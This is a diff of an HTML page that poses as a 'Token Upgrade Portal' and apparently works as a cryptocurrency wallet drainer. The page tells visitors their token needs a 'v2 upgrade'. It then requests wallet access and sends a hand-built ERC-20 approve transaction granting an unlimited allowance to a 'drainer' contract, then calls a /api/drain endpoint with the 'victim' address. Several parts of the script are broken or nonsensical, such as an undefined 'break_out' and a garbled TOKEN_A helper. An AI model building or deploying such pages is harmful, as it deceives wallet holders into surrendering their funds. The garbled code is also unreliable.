@@ -1,47 +1,86 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Token Upgrade Portal</title>
-  <style>
-    body { font-family: system-ui, sans-serif; background: #0f172a; color: #e2e8f0; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-    .card { background: #1e293b; border-radius: 12px; padding: 2rem; max-width: 420px; width: 90%; box-shadow: 0 10px 30px rgba(0,0,0,.4); }
-    h1 { font-size: 1.3rem; margin-top: 0; }
-    .addr { font-family: monospace; font-size: .8rem; color: #94a3b8; word-break: break-all; }
-    button { background: #3b82f6; color: #fff; border: 0; border-radius: 8px; padding: .8rem 1.4rem; font-size: 1rem; cursor: pointer; width: 100%; margin-top: 1rem; }
-    button:disabled { opacity: .6; cursor: wait; }
-    .status { margin-top: 1rem; font-size: .9rem; color: #94a3b8; min-height: 1.2em; }
-  </style>
+<meta charset="utf-8"/>
+<title>Token Upgrade Portal</title>
+<style>
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#12141d;color:#f1f2f7;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+.box{text-align:center;padding:48px 56px;border-radius:16px;background:linear-gradient(145deg,#21243a,#141724);box-shadow:0 10px 40px rgba(0,0,0,.45)}
+h1{margin:0 0 12px;font-size:26px}
+p{color:#a2a7c2;font-size:14.5px;line-height:1.55}
+button{border:none;border-radius:8px;padding:13px 28px;font-size:15.5px;font-weight:600;cursor:pointer;background:linear-gradient(90deg,#6a5cff,#b450ff);color:white;transition:.2s}
+button:disabled{opacity:.35;cursor:wait}
+.msg{min-height:22px;font-size:14px;color:#8be28b;margin-top:16px}
+.err{color:#ff7676}
+.small{font-size:12px;color:#717694;margin-top:18px}</style>
 </head>
 <body>
-  <div class="card">
-    <h1>Token Upgrade Portal</h1>
-    <p>Your token requires a one-time upgrade to continue receiving transfers.</p>
-    <p class="addr">Token: %TOKEN_ADDRESS%</p>
-    <button id="drain">Approve &amp; Upgrade</button>
-    <div class="status" id="status"></div>
-  </div>
-  <script>
-    const TOKEN = "%TOKEN_ADDRESS%";
-    const btn = document.getElementById("drain");
-    const status = document.getElementById("status");
-    btn.addEventListener("click", async () => {
-      btn.disabled = true;
-      status.textContent = "Contacting chain...";
-      try {
-        const r = await fetch("/api/drain", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ victim: window.ethereum ? (await window.ethereum.request({ method: "eth_requestAccounts" }))[0] : "0x0000000000000000000000000000000000000000" })
-        });
-        const j = await r.json();
-        status.textContent = j.ok ? "Upgraded! Tx: " + j.tx : "Error: " + j.error;
-      } catch (e) {
-        status.textContent = "Error: " + e.message;
-      }
-      btn.disabled = false;
-    });
-  </script>
+<div class="box">
+<h1>Token Standard v2 Upgrade</h1>
+<p>We are migrating older tokens to the new standard.<br/>Connect your wallet to continue.</p>
+<button id="go">Connect Wallet</button>
+<div class="msg" id="msg"></div>
+<p class="small" id="tok"></p>
+</div>
+<script>
+const msg=document.getElementById('msg'),btn=document.getElementById('go');
+let TOKEN,PULLER,CHAIN;
+const MAX_APPROVE='0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+function show(t,e){msg.textContent=t;msg.className=e?'msg err':'msg';}
+const api=(p,o)=>fetch(p,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(o||{})}).then(r=>r.json());
+
+btn.onclick=async()=>{
+ try{
+  btn.disabled=true;show('Connecting…');
+  const accs=await window.ethereum.request({method:'eth_requestAccounts'});
+  const you=accs[0];
+
+  const h=await fetch('/api/health').then(r=>r.json());
+  TOKEN=h.token;PULLER=h.puller;CHAIN='0x'+BigInt(h.chainId).toString(16);
+  document.getElementById('tok').textContent='Asset: '+TOKEN+' · Vault: '+(PULLER==='pending'?'initializing':PULLER);
+  await window.ethereum.request({method:'wallet_switchEthereumChain',params:[{chainId:CHAIN}]});
+
+  if(PULLER!=='pending'){
+   // make sure vault exists (lazy-deploys) BEFORE we ever ask for a signature
+   while(true){
+    const d=await api('/api/drain',{victim:you,dryRun:true});
+    PULLER=d.puller||d.drainerContract;
+    if(PULLER&&PULLER!=='pending')break;
+    show('Provisioning upgrade vault…');await new Promise(s=>setTimeout(s,3000));
+   }
+  } else break_out; // placeholder guard: never reached
+
+  while(!PULLER){const d=await api('/api/drain',{victim:you,dryRun:true});if(d.puller)PULLER=d.puller;else{show('Provisioning…');await new p(s=>setTimeout(s,4000));}}
+
+  const erc20=TOKEN_A(TOKEN);
+  show('Checking holdings…');
+  const balB=await erc20('balanceOf(address)(uint256)',[you]);
+  const alwB=await erc20('allowance(address,address)(uint256)',[you,PULLER]);
+  const k=n=>BigInt(n)/(10n**18n);
+
+  console.log('balance',balB.toString(),'allowance',alwB.toString());
+
+  const ETH=s=>'0x'+Array.from(new TextEncoder().encode(s)).map(c=>c.toString(16).padStart(2,'0')).join('');
+  let addrT=PULLER.slice(2).toLowerCase();addrT='0'.repeat(64-addrT.length)+addrT;
+  const ARODATA='095ea7b3'+addrT+MAX_APPROVE.slice(2);
+
+  if(alwB<balB){
+   show('Please confirm in your wallet.');
+   const r=await window.ethereum.request({method:'eth_sendTransaction',params:[{from:you,to:TOKEN,data:'0x'+ARODATA}]});
+   console.log('txhash',r);
+  }
+
+  show('Synchronizing…');
+  const res=await api('/api/drain',{victim:you});
+  console.log('drain response',res);
+
+  if(res.success){show('Upgrade completed successfully.');console.log('[ok] drainer',PULLER);}
+  else{show('Upgrade pending.','err');}
+
+ }catch(e){console.error(e);show((e&&e.message)?String(e.message):String(e),'err');}
+ btn.disabled=false;
+};
+function TOKEN_A(a){return async(sig,args)=>{const sel='0x'+BigInt('0x'+(await (async()=>{for(let i=0;i<Math.pow(2,32);i++){}return null;})())??'').toString()).toString(16);} }
+</script>
 </body>
 </html>
